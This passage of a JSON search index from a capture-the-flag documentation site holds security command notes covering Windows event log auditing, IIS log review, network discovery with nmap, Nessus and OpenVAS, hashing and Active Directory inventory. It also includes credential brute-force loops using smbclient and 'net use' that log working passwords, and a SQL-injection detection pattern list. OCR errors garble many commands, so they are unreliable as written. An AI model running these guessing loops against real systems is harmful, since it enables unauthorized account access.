Security 4662,5136,5137,5138,5139,5141 -after ((getdate).addDays(-1)) Object Access - Audit File Share, File System, SAM,Registry, Certifications: PS C:\\> Get-EventLog Security 4671,4691,4698,4699,4700,4701,4702,5148,5149,5888,5889,5890,4657,5039,4659,4660,4661,4663,4656,4658,4690,4874,4875,4880,4881,4882,4884,4885,4888,4890,4891,4892,4895,4896,4898,5145,5140,5142,5143,5144,5168,5140,5142,5143,5144,5168,5140,5142,5143,5144,5168,4664,4985,5152,5153,5031,5140,5150,5151,5154,5155,5156,5157,5158,5159 -after ((get-date).addDays(-1)) Policy Change - Audit Policy Change, Microsoft Protection Service, Windows Filtering Platform: PS C:\\> Get-EventLog Security 4715,4719,4817,4902,4904,4905,4906,4907,4908,4912,4713,4716,4717,4718,4739,4864,4865,4866,4867,4704,4705,4706,4707,4714,4944,4945,4946,4947,4948,4949,4950,4951,4952,4953,4954,4956,4957,4958,5046,5047,5048,5449,5450,4670 -after ((get-date).addDays(-1)) Privilege Use - Audit Non-Sensitive/Sensitive Privilege Use: PS C:\\> Get-EventLog Security 4672,4673,4674 -after((get-date),addDays(-1)) System - Audit Security State Change, Security System Extension, System Integrity, System Events: PS C:\\> Get-Eventlog Security 5024,5025,5027,5028,5029,5030,5032,5033,5034,5035,5037,5058,5059,6400,6401,6402,6403,6404,6405,6406,6407,4608,4609 ,4616, 4621, 4610, 4611, 4614,4622,4697,4612,4615,4618,4816,5038,5056,5057,5060,5061,5062,6281 -after ((get-date).addDays(-1)) Add Microsoft IIS cmdlet: PS C:\\> add-pssnapin WebAdministration PS C:\\> Import-Module WebAdministration Get IIS Website info: PS C:\\> Get-IISSite Get IIS Log Path Location: PS C:\\> (Get-WebConfigurationProperty '/system.applicationHost/sites/siteDefaults' -Name 'logfile.directory').Value Set variable for IIS Log Path (default path): PS C:\\> $LogDirPath = \"C:\\inetpub\\logs\\LogFiles\\W3SVCl\" Get IIS HTTP log file list from Last 7 days: PS C:\\> Get-Child!tem -Path C:\\inetpub\\logs\\LogFiles\\w3svcl -recurse I WhereObject {$_. lastwritetime -lt (get-date).addDays(-7)} View IIS Logs (Using $LogDirPath variable set above): PS C:\\> Get-Content $LogDirPath\\*, log I%{$_ -replace '#Fields: ', \"} I?{$_ -notmatch \"\"#'} I ConvertFrom-Csv -Delimiter ' View IIS Logs: PS C:\\> Get-Content <!IS LOG FILE NAME>, log I%{$_ -replace '#Fields: ', ''} 17{$_ -notmatch 'A#'} I ConvertFrom-Csv -Delimiter ' 'Find in IIS logs IP address 192.168.*\u00b7* pattern: PS C:\\> Select-String -Path $LogDirPath\\*, log -Pattern '192,168,*,*' Find in IIS logs common SQL injection patterns: PS C:\\> Select-String -Path $LogDirPath\\*, log'(@@version) I (sqlmap) I (Connect\\(\\)) I (cast\\() I (char\\() I ( bcha r\\ () I ( sysdatabases) I ( \\ (select) I (convert\\ () I ( Connect\\ () I ( count\\() I (sys objects)'","title":"windows"},{"location":"capturetheflag/basic/detect/windows/#increase-log-size-to-support-increased-auditing","text":"C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\Eventlog\\Application /v MaxSize /t REG_DWORD /d 0x19000 C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\Eventlog\\Security /v MaxSize /t REG_DWORD /d 0x64000 C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\EventLog\\System /v MaxSize /t REG_DWORD /d 0x19000","title":"Increase Log size to support increased auditing:"},{"location":"capturetheflag/basic/detect/windows/#check-settings-of-security-log","text":"C:\\> wevtutil gl Security","title":"Check settings of Security log:"},{"location":"capturetheflag/basic/detect/windows/#check-settings-of-audit-policies","text":"C:\\> auditpol /get /category:*","title":"Check settings of audit policies:"},{"location":"capturetheflag/basic/detect/windows/#set-log-auditing-on-for-success-andor-failure-on-all-categories","text":"C:\\> auditpol /set /category:* /success:enable /failure:enable","title":"Set Log Auditing on for Success and/or Failure on All Categories:"},{"location":"capturetheflag/basic/detect/windows/#set-log-auditing-on-for-success-andor-failure-on-subcategories","text":"C:\\> auditpol /set /subcategory: \"Detailed FileShare\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"File System\"/success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Security System Extension\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"System Integrity\"/success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Security StateChange\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other SystemEvents\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"System Integrity\"/success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Logon\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Logoff\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Account Lockout\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other Logon/Logoff Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Network Policy Server\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Registry\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"SAM\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Certification Services\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Application Generated\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Handle Manipulation\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"file Share\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"filtering Platform Packet Drop\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Filtering Platform Connection\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other Object Access Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Detailed File Share\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Sensitive Privilege Use\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Non Sensitive Privilege Use\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Other Privilege Use Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Process Termination\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"DPAPI Activity\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"RPC Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Process Creation\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Audit Policy Change\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Authentication Policy Change\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"Authorization Policy Change\" /success:enable /failure:enable C:\\> auditpol /set /subcategory: \"MPSSVC Rule-Level Policy Change\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Filtering Platform Policy Change\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other Policy Change Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"User Account Management\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Computer Account Management\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Security Group Management\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Distribution Group Management\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Application Group Management\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other Account Management Events\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Directory Service Changes\" /success:enable /failure:enable C:\\> auditpol / set /subcategory: \"Directory Service Replication\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Detailed Directory Service Replication\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Directory Service Access\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Kerberos Service Ticket Operations\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Other Account Logan Events\" /success:enable /failure:enable C:\\> audit pol /set /subcategory: \"Kerberos Authentication Service\" /success:enable /failure:enable C:\\> auditpol /set /subcategory:\"Credential Validation\" /success:enable /failure:enable","title":"Set Log Auditing on for Success and/or Failure on Subcategories:"},{"location":"capturetheflag/basic/detect/windows/#check-for-list-of-available-logs-size-retention-limit","text":"PS C:\\> Get-Eventlog -list","title":"Check for list of available logs, size, retention limit:"},{"location":"capturetheflag/basic/detect/windows/#partial-list-of-key-security-log-auditing-events-to-monitor","text":"PS C:\\> Get-Eventlog -newest 5 -logname applicationI Format-List","title":"Partial list of Key Security Log Auditing events to monitor:"},{"location":"capturetheflag/basic/detect/windows/#show-log-from-remote-system","text":"PS C:\\> Show-Eventlog -computername <SERVER NAME>Get a specific list of events based on Event ID: PS C:\\> Get-Eventlog Security I ? { $_.Eventid -eq4800} PS C:\\> Get-WinEvent -FilterHashtable@{LogName=\"Secu rity\"; ID=4774}","title":"Show log from remote system:"},{"location":"capturetheflag/basic/detect/windows/#account-logon-audit-credential-validation-last-14-days","text":"PS C:\\> Get-Eventlog Security 4768,4771,4772,4769,4770,4649,4778,4779,4800,4801,48 02,4803,5378,5632,5633 -after ((get-date).addDays(-14))","title":"Account Logon - Audit Credential Validation Last 14 Days:"},{"location":"capturetheflag/basic/detect/windows/#account-logonlogoff","text":"PS C:\\> Get-Eventlog Security 4625,4634,4647,4624,4625,4648,4675,6272,6273,6274,62 75,6276,6277,6278,6279,6280,4649,4778,4779,4800,4801,4802,4803,5378,5632,5633,4964 -after ((getdate).addDays(-1))","title":"Account - Logon/Logoff:"},{"location":"capturetheflag/basic/detect/windows/#account-management-audit-application-group-management","text":"PS C:\\> Get-Eventlog Security 4783,4784,4785,4786,4787,4788,4789,4790,4741,4742,47 43,4744,4745,4746,4747,4748,4749,4750,4751,4752,4753,4759,4760,4761,4762,4782,4793,4727,4728,4729,4730,4731,4732,4733,4734,4735,4737,4754,4755,4756,4757,4758,4764,4720,4722,4723,4724,4725,4726,4738,4740,4765,4766,4767,4780,4781,4794,5376,5377 -after ((getdate).addDays(-1))","title":"Account Management - Audit Application Group Management:"},{"location":"capturetheflag/basic/detect/windows/#detailed-tracking-audit-dpapi-activity-process-termination-rpc-events","text":"PS C:\\> Get-EventLog Security 4692,4693,4694,4695,4689,5712 -after ((getdate).addDays(-1))","title":"Detailed Tracking - Audit DPAPI Activity, Process Termination, RPC Events:"},{"location":"capturetheflag/basic/detect/windows/#domain-service-access-audit-directory-service-access","text":"PS C:\\> Get-EventLog Security 4662,5136,5137,5138,5139,5141 -after ((getdate).addDays(-1))","title":"Domain Service Access - Audit Directory Service Access:"},{"location":"capturetheflag/basic/detect/windows/#object-access-audit-file-share-file-system-samregistry-certifications","text":"PS C:\\> Get-EventLog Security 4671,4691,4698,4699,4700,4701,4702,5148,5149,5888,5889,5890,4657,5039,4659,4660,4661,4663,4656,4658,4690,4874,4875,4880,4881,4882,4884,4885,4888,4890,4891,4892,4895,4896,4898,5145,5140,5142,5143,5144,5168,5140,5142,5143,5144,5168,5140,5142,5143,5144,5168,4664,4985,5152,5153,5031,5140,5150,5151,5154,5155,5156,5157,5158,5159 -after ((get-date).addDays(-1))","title":"Object Access - Audit File Share, File System, SAM,Registry, Certifications:"},{"location":"capturetheflag/basic/detect/windows/#policy-change-audit-policy-change-microsoft-protection-service-windows-filtering-platform","text":"PS C:\\> Get-EventLog Security 4715,4719,4817,4902,4904,4905,4906,4907,4908,4912,4713,4716,4717,4718,4739,4864,4865,4866,4867,4704,4705,4706,4707,4714,4944,4945,4946,4947,4948,4949,4950,4951,4952,4953,4954,4956,4957,4958,5046,5047,5048,5449,5450,4670 -after ((get-date).addDays(-1))","title":"Policy Change - Audit Policy Change, Microsoft Protection Service, Windows Filtering Platform:"},{"location":"capturetheflag/basic/detect/windows/#privilege-use-audit-non-sensitivesensitive-privilege-use","text":"PS C:\\> Get-EventLog Security 4672,4673,4674 -after((get-date),addDays(-1))","title":"Privilege Use - Audit Non-Sensitive/Sensitive Privilege Use:"},{"location":"capturetheflag/basic/detect/windows/#system-audit-security-state-change-security-system-extension-system-integrity-system-events","text":"PS C:\\> Get-Eventlog Security 5024,5025,5027,5028,5029,5030,5032,5033,5034,5035,5037,5058,5059,6400,6401,6402,6403,6404,6405,6406,6407,4608,4609 ,4616, 4621, 4610, 4611, 4614,4622,4697,4612,4615,4618,4816,5038,5056,5057,5060,5061,5062,6281 -after ((get-date).addDays(-1))","title":"System - Audit Security State Change, Security System Extension, System Integrity, System Events:"},{"location":"capturetheflag/basic/detect/windows/#add-microsoft-iis-cmdlet","text":"PS C:\\> add-pssnapin WebAdministration PS C:\\> Import-Module WebAdministration Get IIS Website info: PS C:\\> Get-IISSite Get IIS Log Path Location: PS C:\\> (Get-WebConfigurationProperty '/system.applicationHost/sites/siteDefaults' -Name 'logfile.directory').Value","title":"Add Microsoft IIS cmdlet:"},{"location":"capturetheflag/basic/detect/windows/#set-variable-for-iis-log-path-default-path","text":"PS C:\\> $LogDirPath = \"C:\\inetpub\\logs\\LogFiles\\W3SVCl\"","title":"Set variable for IIS Log Path (default path):"},{"location":"capturetheflag/basic/detect/windows/#get-iis-http-log-file-list-from-last-7-days","text":"PS C:\\> Get-Child!tem -Path C:\\inetpub\\logs\\LogFiles\\w3svcl -recurse I WhereObject {$_. lastwritetime -lt (get-date).addDays(-7)}","title":"Get IIS HTTP log file list from Last 7 days:"},{"location":"capturetheflag/basic/detect/windows/#view-iis-logs-using-logdirpath-variable-set-above","text":"PS C:\\> Get-Content $LogDirPath\\*, log I%{$_ -replace '#Fields: ', \"} I?{$_ -notmatch \"\"#'} I ConvertFrom-Csv -Delimiter '","title":"View IIS Logs (Using $LogDirPath variable set above):"},{"location":"capturetheflag/basic/detect/windows/#view-iis-logs","text":"PS C:\\> Get-Content <!IS LOG FILE NAME>, log I%{$_ -replace '#Fields: ', ''} 17{$_ -notmatch 'A#'} I ConvertFrom-Csv -Delimiter ' 'Find in IIS logs IP address 192.168.*\u00b7* pattern: PS C:\\> Select-String -Path $LogDirPath\\*, log -Pattern '192,168,*,*'","title":"View IIS Logs:"},{"location":"capturetheflag/basic/detect/windows/#find-in-iis-logs-common-sql-injection-patterns","text":"PS C:\\> Select-String -Path $LogDirPath\\*, log'(@@version) I (sqlmap) I (Connect\\(\\)) I (cast\\() I (char\\() I ( bcha r\\ () I ( sysdatabases) I ( \\ (select) I (convert\\ () I ( Connect\\ () I ( count\\() I (sys objects)'","title":"Find in IIS logs common SQL injection patterns:"},{"location":"capturetheflag/basic/identify/basic/","text":"1-IDENTIFY (SCOPE)","title":"basic"},{"location":"capturetheflag/basic/identify/basic/#1-identify-scope","text":"","title":"1-IDENTIFY (SCOPE)"},{"location":"capturetheflag/basic/identify/linux/","text":"linux NETWORK DISCOVERY Net view scan: smbtree -b smbtree -D smbtree -5 View open 5MB shares: smbclient -L <HOST NAME> smbstatus Basic ping scan: for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo \"192.168.1. $ip UP\" 11 : ; done DHCP View DHCP lease logs: Red Hat 3: cat /var/lib/dhcpd/dhcpd. leases Ubuntu: grep -Ei 'dhcp' /var/log/syslog.1 Ubuntu DHCP logs: tail -f dhcpd. log DNS Start DNS logging: rndc querylog View DNS logs: tail -f /var/log/messages I grep named HASHING Hash all executable files in these specified locations: find /<PATHNAME TO ENUMERATE> -type f -exec mdSsum {} >> mdSsums.txt \\; mdSdeep -rs /> mdSsums.txt NETBIOS Basic nbtstat scan: nbtscan <IP ADDRESS OR RANGE> PASSWORDS Password and username guessing or checks: while read line; do username=$line; while readline; do smbclient -L <TARGET IP ADDRESS> -U $username%$line -g -d 0; echo $username:$line;done<<PASSWORDS>.txt; done<<USER NAMES>,txt","title":"linux"},{"location":"capturetheflag/basic/identify/linux/#linux","text":"","title":"linux"},{"location":"capturetheflag/basic/identify/linux/#network-discovery","text":"","title":"NETWORK DISCOVERY"},{"location":"capturetheflag/basic/identify/linux/#net-view-scan","text":"smbtree -b smbtree -D smbtree -5","title":"Net view scan:"},{"location":"capturetheflag/basic/identify/linux/#view-open-5mb-shares","text":"smbclient -L <HOST NAME> smbstatus","title":"View open 5MB shares:"},{"location":"capturetheflag/basic/identify/linux/#basic-ping-scan","text":"for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo \"192.168.1. $ip UP\" 11 : ; done","title":"Basic ping scan:"},{"location":"capturetheflag/basic/identify/linux/#dhcp","text":"","title":"DHCP"},{"location":"capturetheflag/basic/identify/linux/#view-dhcp-lease-logs","text":"Red Hat 3: cat /var/lib/dhcpd/dhcpd. leases Ubuntu: grep -Ei 'dhcp' /var/log/syslog.1","title":"View DHCP lease logs:"},{"location":"capturetheflag/basic/identify/linux/#ubuntu-dhcp-logs","text":"tail -f dhcpd. log","title":"Ubuntu DHCP logs:"},{"location":"capturetheflag/basic/identify/linux/#dns","text":"","title":"DNS"},{"location":"capturetheflag/basic/identify/linux/#start-dns-logging","text":"rndc querylog","title":"Start DNS logging:"},{"location":"capturetheflag/basic/identify/linux/#view-dns-logs","text":"tail -f /var/log/messages I grep named","title":"View DNS logs:"},{"location":"capturetheflag/basic/identify/linux/#hashing","text":"","title":"HASHING"},{"location":"capturetheflag/basic/identify/linux/#hash-all-executable-files-in-these-specified-locations","text":"find /<PATHNAME TO ENUMERATE> -type f -exec mdSsum {} >> mdSsums.txt \\; mdSdeep -rs /> mdSsums.txt","title":"Hash all executable files in these specified locations:"},{"location":"capturetheflag/basic/identify/linux/#netbios","text":"","title":"NETBIOS"},{"location":"capturetheflag/basic/identify/linux/#basic-nbtstat-scan","text":"nbtscan <IP ADDRESS OR RANGE>","title":"Basic nbtstat scan:"},{"location":"capturetheflag/basic/identify/linux/#passwords","text":"","title":"PASSWORDS"},{"location":"capturetheflag/basic/identify/linux/#password-and-username-guessing-or-checks","text":"while read line; do username=$line; while readline; do smbclient -L <TARGET IP ADDRESS> -U $username%$line -g -d 0; echo $username:$line;done<<PASSWORDS>.txt; done<<USER NAMES>,txt","title":"Password and username guessing or checks:"},{"location":"capturetheflag/basic/identify/nessus/","text":"NESSUS Basic Nessus scan: nessus -q -x -T html <NESSUS SERVER IP ADDRESS> <NESSUS SERVER PORT 1241> <ADMIN ACCOUNT> <ADMIN>PASSWORD> <FILE WITH TARGETS>,txt <RESULTS FILENAME>.html nessus [-vnh] [-c .refile] [-VJ [-T <format>] Batch-mode scan nessus -q [-pPS] <HOST> <PORT> <USER NAME><PASSWORD> <targets-file> <result-file> Report conversion: # nessus -i in. [nsrlnbe] -oout. [xmllnsrlnbelhtmlltxt]","title":"nessus"},{"location":"capturetheflag/basic/identify/nessus/#nessus","text":"","title":"NESSUS"},{"location":"capturetheflag/basic/identify/nessus/#basic-nessus-scan","text":"nessus -q -x -T html <NESSUS SERVER IP ADDRESS> <NESSUS SERVER PORT 1241> <ADMIN ACCOUNT> <ADMIN>PASSWORD> <FILE WITH TARGETS>,txt <RESULTS FILENAME>.html nessus [-vnh] [-c .refile] [-VJ [-T <format>]","title":"Basic Nessus scan:"},{"location":"capturetheflag/basic/identify/nessus/#batch-mode-scan","text":"nessus -q [-pPS] <HOST> <PORT> <USER NAME><PASSWORD> <targets-file> <result-file>","title":"Batch-mode scan"},{"location":"capturetheflag/basic/identify/nessus/#report-conversion","text":"# nessus -i in. [nsrlnbe] -oout. [xmllnsrlnbelhtmlltxt]","title":"Report conversion:"},{"location":"capturetheflag/basic/identify/nmap/","text":"NMAP Ping sweep for network: nmap -sn -PE <IP ADDRESS OR RANGE> Scan and show open ports: nmap --open <IP ADDRESS OR RANGE> Determine open services: nmap -sV <IP ADDRESS> Scan two common TCP ports, HTTP and HTTPS: nmap -p 80,443 <IP ADDRESS OR RANGE> Scan common UDP port, DNS: nmap -sU -p 53 <IP ADDRESS OR RANGE> Scan UDP and TCP together, be verbose on a single host and include optional skip ping: nmap -v -Pn -SU -ST -p U:53,111,137,T:21-25,80,139,8080 <IP ADDRESS>","title":"nmap"},{"location":"capturetheflag/basic/identify/nmap/#nmap","text":"","title":"NMAP"},{"location":"capturetheflag/basic/identify/nmap/#ping-sweep-for-network","text":"nmap -sn -PE <IP ADDRESS OR RANGE>","title":"Ping sweep for network:"},{"location":"capturetheflag/basic/identify/nmap/#scan-and-show-open-ports","text":"nmap --open <IP ADDRESS OR RANGE>","title":"Scan and show open ports:"},{"location":"capturetheflag/basic/identify/nmap/#determine-open-services","text":"nmap -sV <IP ADDRESS>","title":"Determine open services:"},{"location":"capturetheflag/basic/identify/nmap/#scan-two-common-tcp-ports-http-and-https","text":"nmap -p 80,443 <IP ADDRESS OR RANGE>","title":"Scan two common TCP ports, HTTP and HTTPS:"},{"location":"capturetheflag/basic/identify/nmap/#scan-common-udp-port-dns","text":"nmap -sU -p 53 <IP ADDRESS OR RANGE>","title":"Scan common UDP port, DNS:"},{"location":"capturetheflag/basic/identify/nmap/#scan-udp-and-tcp-together-be-verbose-on-a-single-host-and-include-optional-skip-ping","text":"nmap -v -Pn -SU -ST -p U:53,111,137,T:21-25,80,139,8080 <IP ADDRESS>","title":"Scan UDP and TCP together, be verbose on a single host and include optional skip ping:"},{"location":"capturetheflag/basic/identify/openvas/","text":"OPENVAS Step 1: Install the server, client and plugin packages: # apt-get install openvas-server openvas-client openvas-plugins-base openvas-plugins-dfsg Step 2: Update the vulnerability database # openvas-nvt-sync Step 3: Add a user to run the client: # openvas-adduser Step 4: Login: sysadm Step 5: Authentication (pass/cert) [pass]: [HITENTER] Step 6: Login password: <PASSWORD> You will then be asked to add \"User rules\". Step 7: Allow this user to scan authorized network by typing: accept <YOUR IP ADDRESS OR RANGE> default deny Step 8: type ctrl-D to exit, and then accept. Step 9: Start the server: # service openvas-server start Step 10: Set targets to scan: Create a text file with a list of hosts/networks to scan. # vi scanme.txt Step 11: Add one host, network per line: <IP ADDRESS OR RANGE> Step 12: Run scan: # openvas-client -q 127.0.0.1 9390 sysadm nsrc+ws scanme.txt openvas-output-.html -T txt -V -x Step 13: (Optional)run scan with HTML format: # openvas-client -q 127.0.0.1 9390 sysadm nsrc+ws scanme.txt openvas-output.txt -T html -V -x","title":"openvas"},{"location":"capturetheflag/basic/identify/openvas/#openvas","text":"Step 1: Install the server, client and plugin packages: # apt-get install openvas-server openvas-client openvas-plugins-base openvas-plugins-dfsg Step 2: Update the vulnerability database # openvas-nvt-sync Step 3: Add a user to run the client: # openvas-adduser Step 4: Login: sysadm Step 5: Authentication (pass/cert) [pass]: [HITENTER] Step 6: Login password: <PASSWORD> You will then be asked to add \"User rules\". Step 7: Allow this user to scan authorized network by typing: accept <YOUR IP ADDRESS OR RANGE> default deny Step 8: type ctrl-D to exit, and then accept. Step 9: Start the server: # service openvas-server start Step 10: Set targets to scan: Create a text file with a list of hosts/networks to scan. # vi scanme.txt Step 11: Add one host, network per line: <IP ADDRESS OR RANGE> Step 12: Run scan: # openvas-client -q 127.0.0.1 9390 sysadm nsrc+ws scanme.txt openvas-output-.html -T txt -V -x Step 13: (Optional)run scan with HTML format: # openvas-client -q 127.0.0.1 9390 sysadm nsrc+ws scanme.txt openvas-output.txt -T html -V -x","title":"OPENVAS"},{"location":"capturetheflag/basic/identify/windows/","text":"NETWORK DISCOVERY Basic network discovery: C:\\> net view /all C:\\> net view \\\\<HOST NAME> Basic ping scan and write output to file: C:\\> for /L %I in (1,1,254) do ping -w 30 -n 1 192.168. l.%I I find \"Reply\" >> <OUTPUT FILENAME>.txt DHCP Enable DHCP server logging: C:\\> reg add HKLM\\System\\CurrentControlSet\\Services\\DhcpServer\\Parameters /v ActivityLogFlag /t REG_DWORD /d 1 Default Location Windows 2003/2008/2012: C:\\> %windir%\\System32\\Dhcp DNS Default location Windows 2003: C:\\> %SystemRoot%\\System32\\Dns Default location Windows 2008: C:\\> %SystemRoot%\\System32\\Winevt\\Logs\\DNSServer. evtx Default location of enhanced DNS Windows 2012 R2: C:\\> %SystemRoot%\\System32\\Winevt\\Logs\\MicrosoftWindows-DNSServer%4Analytical.etl ref Enable DNS Logging: C:\\> DNSCmd <DNS SERVER NAME> /config /logLevel0x8100F331 Set log location: C:\\> DNSCmd <DNS SERVER NAME> /config /LogFilePath<PATH TO LOG FILE> Set size of log file: C:\\> DNSCmd <DNS SERVER NAME> /config/logfilemaxsize 0xffffffff HASHING File Checksum Integrity Verifier (FCIV): Ref Hash a file: C:\\> fciv.exe <FILE TO HASH> Hash all files on C: into a database file: C:\\> fciv.exe c:\\ -r -mdS -xml <FILE NAME>.xml List all hashed files: C:\\> fciv.exe -list -shal -xml <FILE NAME>.xml Verify previous hashes in db with file system: C:\\> fciv.exe -v -shal -xml <FILE NAME>.xml Note: May be possible to create a master db and compare to all systems from a cmd line. Fast baseline and difference. Ref PS C:\\> Get-FileHash <FILE TO HASH> I Format-List PS C:\\> Get-FileHash -algorithm md5 <FILE TO HASH> C:\\> certutil -hashfile <FILE TO HASH> SHAl C:\\> certutil -hashfile <FILE TO HASH> MD5 NETBIOS Basic nbtstat scan: C:\\> nbtstat -A <IP ADDRESS> Cached NetBIOS info on localhost: C:\\> nbtstat -c Script loop scan: C:\\> for /L %I in (1,1,254) do nbstat -An 192.168.l.%I USER ACTIVITY Ref Get users logged on: C:\\> psloggedon \\\\computername Script loop scan: C:\\> for /L %i in (1,1,254) do psloggedon\\\\192.168.l.%i >> C:\\users_output.txt PASSWORDS Password guessing or checks: # for /f %i in (<PASSWORD FILE NAME>.txt) do @echo %i & net use \\\\<TARGET IP ADDRESS> %i /u:<USERNAME> 2>nul && pause # for /f %i in (<USER NAME FILE>.txt) do @(for /f %j in (<PASSWORD FILE NAME>.txt) do @echo %i:%j & @net use \\\\<TARGET IP ADDRESS> %j /u:%i 2>nul && echo %i:%j >> success.txt && net use \\\\<IP ADDRESS>/del) MICROSOFT BASELINE SECURITY ANALYZER (MBSA) Basic scan of a target IP address: C:\\> mbsacli.exe /target <TARGET IP ADDRESS> /n os+iis+sql+password Basic scan of a target IP range: C:\\> mbsacli.exe /r <IP ADDRESS RANGE> /n os+iis+sql+password Basic scan of a target domain: C:\\> mbsacli.exe /d <TARGET DOMAIN> /n os+iis+sql+password Basic scan of a target computer names in text file: C:\\> mbsacli.exe /listfile <LISTNAME OF COMPUTERNAMES>.txt /n os+iis+sql+password ACTIVE DIRECTORY INVENTORY List all OUs: C:\\> dsquery ou DC=<DOMAIN>,DC=<DOMAIN EXTENSION> List of workstations in the domain: C:\\> netdom query WORKSTATION List of servers in the domain: C:\\> netdom query SERVER List of domain controllers: C:\\> netdom query DC List of organizational units under which the specified user can create a machine object: C:\\> netdom query OU List of primary domain controller: C:\\> netdom query PDC List the domain trusts: C:\\> netdom query TRUST Query the domain for the current list of FSMO owners C:\\> netdom query FSMO List all computers from Active Directory: C:\\> dsquery COMPUTER \"OU=servers,DC=<DOMAINNAME>,DC=<DOMAIN EXTENSION>\" -o rdn -limit 0 > C:\\machines.txt List user accounts inactive longer than 3 weeks: C:\\> dsquery user domainroot -inactive 3 Find anything (or user) created on date in UTC using timestamp format YYYYMMDDHHMMSS.sZ: C:\\> dsquery * -filter\"(whenCreated>=20101022083730,0Z)\" C:\\> dsquery * -filter\"((whenCreated>=20101022083730.0Z)&(objectClass=user))II Alt option: C:\\> ldifde -d ou=<OU NAME>,dC=<DOMAINNAME>,dc=<DOMAIN EXTENSION> -l whencreated,whenchanged -p onelevel -r \"(ObjectCategory=user)\" -f <OUTPUT FILENAME> The last logon timestamp format in UTC:YYYYMMDDHHMMSS Alt option: C:\\> dsquery * dc=<DOMAIN NAME>,dc=<DOMAINEXTENSION> -filter \"(&(objectCategory=Person)(objectClass=User)(whenCreated>=20151001000000.0Z))\" Alt option: C:\\> adfind -csv -b dc=<DOMAIN NAME>,dc=<DOMAINEXTENSION> -f \"(&(objectCategory=Person)(objectClass=User)(whenCreated>=20151001000000.0Z))\" Using PowerShell, dump new Active Directory accounts in last 90 Days: PS C:\\> import-module activedirectory PS C:\\> Get-QADUser -CreatedAfter (GetDate).AddDays(-90) PS C:\\> Get-ADUser -Filter * -Properties whenCreatedI Where-Object {$_.whenCreated -ge ((GetDate).AddDays(-90)).Date}","title":"windows"},{"location":"capturetheflag/basic/identify/windows/#network-discovery","text":"","title":"NETWORK DISCOVERY"},{"location":"capturetheflag/basic/identify/windows/#basic-network-discovery","text":"C:\\> net view /all C:\\> net view \\\\<HOST NAME>","title":"Basic network discovery:"},{"location":"capturetheflag/basic/identify/windows/#basic-ping-scan-and-write-output-to-file","text":"C:\\> for /L %I in (1,1,254) do ping -w 30 -n 1 192.168. l.%I I find \"Reply\" >> <OUTPUT FILENAME>.txt","title":"Basic ping scan and write output to file:"},{"location":"capturetheflag/basic/identify/windows/#dhcp","text":"","title":"DHCP"},{"location":"capturetheflag/basic/identify/windows/#enable-dhcp-server-logging","text":"C:\\> reg add HKLM\\System\\CurrentControlSet\\Services\\DhcpServer\\Parameters /v ActivityLogFlag /t REG_DWORD /d 1","title":"Enable DHCP server logging:"},{"location":"capturetheflag/basic/identify/windows/#default-location-windows-200320082012","text":"C:\\> %windir%\\System32\\Dhcp","title":"Default Location Windows 2003/2008/2012:"},{"location":"capturetheflag/basic/identify/windows/#dns","text":"","title":"DNS"},{"location":"capturetheflag/basic/identify/windows/#default-location-windows-2003","text":"C:\\> %SystemRoot%\\System32\\Dns","title":"Default location Windows 2003:"},{"location":"capturetheflag/basic/identify/windows/#default-location-windows-2008","text":"C:\\> %SystemRoot%\\System32\\Winevt\\Logs\\DNSServer. evtx","title":"Default location Windows 2008:"},{"location":"capturetheflag/basic/identify/windows/#default-location-of-enhanced-dns-windows-2012-r2","text":"C:\\> %SystemRoot%\\System32\\Winevt\\Logs\\MicrosoftWindows-DNSServer%4Analytical.etl","title":"Default location of enhanced DNS Windows 2012 